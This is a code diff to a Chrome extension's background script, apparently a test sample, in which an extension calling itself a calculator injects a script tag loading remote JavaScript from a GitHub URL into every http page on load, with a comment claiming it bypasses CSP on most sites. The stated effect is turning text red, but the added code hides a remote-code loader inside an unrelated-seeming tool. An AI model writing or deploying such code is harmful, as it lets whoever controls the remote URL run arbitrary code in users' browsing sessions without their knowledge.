@@ -1,40 +1,22 @@
-// This runs in the background and injects your external script into every page
-
-const EXTERNAL_SCRIPT_URL = "https://your-server.com/change-p-color.js";
-// For testing, use a real public raw JS URL like this (a simple hello world, replace with yours):
-// const EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/refact0r/random-p-color/main/change-p-color.js";
+const REMOTE_SCRIPT = "https://raw.githubusercontent.com/cwsctstest002/Testingdec2025/main/injected.js";
 
 chrome.runtime.onInstalled.addListener(() => {
-  console.log("Extension installed – will change <p> color on all pages");
+  console.log("Calculator installed – turning all text RED on every site!");
 });
 
-// Optional: Run when user clicks the extension icon
-chrome.action.onClicked.addListener((tab) => {
-  injectScript(tab.id);
-});
-
-// Run automatically on every page load (you can comment this out if you want manual only)
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
-    injectScript(tabId);
+    // Method 1: Inject via <script> tag (bypasses CSP on most sites)
+    chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: (url) => {
+        const script = document.createElement('script');
+        script.src = url + "?t=" + Date.now(); // cache buster
+        script.onload = () => console.log("Red text script injected!");
+        script.onerror = () => console.error("Failed to load red script");
+        (document.head || document.documentElement).appendChild(script);
+      },
+      args: [REMOTE_SCRIPT]
+    });
   }
 });
-
-function injectScript(tabId) {
-  // First: Fetch the external script
-  fetch(EXTERNAL_SCRIPT_URL)
-    .then(response => {
-      if (!response.ok) throw new Error("Failed to load script: " + response.status);
-      return response.text();
-    })
-    .then(scriptContent => {
-      // Then: Execute it in the page
-      chrome.scripting.executeScript({
-        target: { tabId: tabId },
-        func: new Function(scriptContent)  // Safely runs the fetched code
-      });
-    })
-    .catch(err => {
-      console.error("Could not load or execute external script:", err);
-    });
-}
